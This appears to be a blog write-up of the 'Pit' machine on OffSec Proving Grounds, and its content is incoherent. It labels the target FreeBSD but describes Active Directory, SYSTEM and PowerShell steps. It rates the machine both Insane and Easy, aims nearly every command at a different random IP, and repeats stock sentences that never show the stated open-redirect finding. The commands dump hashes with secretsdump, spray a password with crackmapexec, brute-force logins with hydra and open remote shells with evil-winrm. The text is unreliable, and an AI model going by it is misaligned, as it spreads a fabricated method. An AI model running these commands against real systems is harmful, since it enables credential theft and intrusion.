---
TitleSEO: "OffSec Proving Grounds — Pit (Insane FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Pit (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Pit. Open Redirect and Unconstrained Delegation to achieve insane compromise on FreeBSD."
Keywords: "easy, offsec, web, ctf, reversing"
URL: "https://zurefx.github.io/writeups/htb-pit-691.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-pit-691/"
Date: "2026-01-26"
Tags: "Easy, OffSec, Web, CTF, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-pit-691"
Permalink: "/writeups/htb-pit-691.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Pit** is rated **Insane** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.38.7.138`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.99.47.143
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.119.160/FUZZ
```

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.105.104.102 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p25,464,445 10.30.13.41 -oN scan.txt
nmap -sCV -p995,636,8080 10.81.137.13 -oN scan.txt
```

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Open Redirect**.

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.66.137.195 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.189.210
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.3.118 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

```powershell
crackmapexec smb 10.117.146.183 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p23,22,445 10.41.239.78 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.125.6
impacket-secretsdump administrator:'P@ssw0rd!'@10.57.58.124
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.12.137.231 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.129.58.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.96.45.132 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `chisel`
- `ldapsearch`
- `dcomexec`
- `wmiexec`
- `bloodhound`
- `metasploit`
- `feroxbuster`

### Key Takeaways

- Open Redirect
- Unconstrained Delegation
